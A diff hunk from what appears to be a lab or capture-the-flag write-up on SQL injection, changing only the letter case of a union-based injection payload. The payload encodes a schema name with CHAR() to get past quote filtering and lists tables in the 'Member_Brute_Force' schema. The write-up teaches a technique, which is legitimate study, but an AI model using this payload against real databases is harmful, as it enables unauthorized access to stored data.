@@ -22,7 +22,7 @@ To bypass that, `CHAR()` function can be used. First, the string needs to be con
 ```
 Hence, SQL request will be following
 ```sql
-1 and 1=1 union select table_name,2 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
+1 AND 1=1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
 ```
 
 by doing so, we can find `db_default` table in `Member_Brute_Force` schema:
